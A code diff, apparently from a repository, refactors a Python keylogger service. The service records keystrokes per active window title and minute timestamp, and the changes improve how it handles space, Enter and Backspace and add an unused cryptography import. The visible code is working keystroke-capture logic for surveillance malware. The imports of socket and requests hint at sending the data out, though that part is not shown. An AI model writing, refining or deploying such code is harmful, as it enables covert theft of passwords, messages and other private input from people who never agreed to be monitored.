@@ -8,6 +8,9 @@ import socket
 import requests
 import time
 
+from win32cryptcon import szOID_RSA
+
+
 class IKeyLogger(ABC):
 
     @abstractmethod
@@ -44,24 +47,35 @@ class KeyLoggerService(IKeyLogger):
         if not self.running:
             return
 
-        window = self._get_window()
+        window = KeyLoggerService._get_window()
         if window not in self.data:
             self.data[window] = {}
-        time = self._get_time()
+        time = KeyLoggerService._get_time()
         if time not in self.data[window]:
             self.data[window][time] = ""
 
-        if hasattr(key, 'char') and key.char is not None:
-            self.data[window][time] += key.char
-        elif str(key) == "Key.space":
-            self.data[window][time] += " "
-        else:
-            self.data[window][time] += f" [{key}] "
+        try:
+            key_str = key.char if hasattr(key, 'char') and key.char is not None else str(key)
 
-    def _get_time(self):
+            if key_str.startswith("Key."):
+
+                if key_str == "Key.space":
+                    self.data[window][time] += " "
+                elif key_str == "Key.enter":
+                    self.data[window][time] += "\n"
+                elif key_str == "Key.backspace" and len(self.data[window][time]) >= 1:
+                    self.data[window][time] = self.data[window][time][:-1]
+            else:
+                self.data[window][time] += key_str
+        except Exception as e:
+            print(f"Error processing key: {e}")
+
+    @staticmethod
+    def _get_time():
         return datetime.now().strftime("%Y-%m-%d %H:%M")
 
-    def _get_window(self):
+    @staticmethod
+    def _get_window():
         window = gw.getActiveWindow()
         return window.title if window else "Unknown Window"
 
